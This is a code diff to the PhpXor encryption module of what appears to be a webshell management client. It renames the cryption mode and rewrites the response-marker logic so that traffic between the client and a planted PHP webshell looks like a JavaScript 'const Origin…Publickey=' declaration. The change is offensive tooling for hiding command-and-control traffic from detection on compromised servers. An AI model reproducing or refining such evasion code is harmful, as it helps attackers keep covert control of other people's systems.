@@ -1,7 +1,5 @@
-/*
- * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
- */
 package shells.cryptions.phpXor;
+
 
 import core.annotation.CryptionAnnotation;
 import core.imp.Cryption;
@@ -11,10 +9,15 @@ import shells.cryptions.phpXor.Generate;
 import util.Log;
 import util.functions;
 import util.http.Http;
+/**
+ * Created by codervibe on 2025/2/5
+ * DateTime:2025/02/05 下午3:22
+ * Description:
+ * Others:
+ */
 
-@CryptionAnnotation(Name="PHP_XOR_BASE64", payloadName="PhpDynamicPayload")
-public class PhpXor
-implements Cryption {
+@CryptionAnnotation(Name="PHP_XOR_BASE64_2", payloadName="PhpDynamicPayload")
+public class PhpXor implements Cryption {
     private ShellEntity shell;
     private Http http;
     private byte[] key;
@@ -22,6 +25,7 @@ implements Cryption {
     private String pass;
     private byte[] payload;
     private String findStrLeft;
+    private String findStrLeft1;
     private String findStrRight;
 
     @Override
@@ -31,8 +35,12 @@ implements Cryption {
         this.key = this.shell.getSecretKeyX().getBytes();
         this.pass = this.shell.getPassword();
         String findStrMd5 = functions.md5(this.pass + new String(this.key));
-        this.findStrLeft = findStrMd5.substring(0, 16);
-        this.findStrRight = findStrMd5.substring(16);
+//        this.findStrLeft = findStrMd5.substring(0, 16);
+//        this.findStrRight = findStrMd5.substring(16);
+        String md5Prefix =findStrMd5.substring(0, 5);
+        this.findStrLeft1 = "const OriginJNOTLPublickey=";
+        this.findStrLeft = this.findStrLeft1.replace("JNOTL",md5Prefix);
+        this.findStrRight = ";";
         try {
             this.payload = this.shell.getPayloadModule().getPayload();
             if (this.payload != null) {
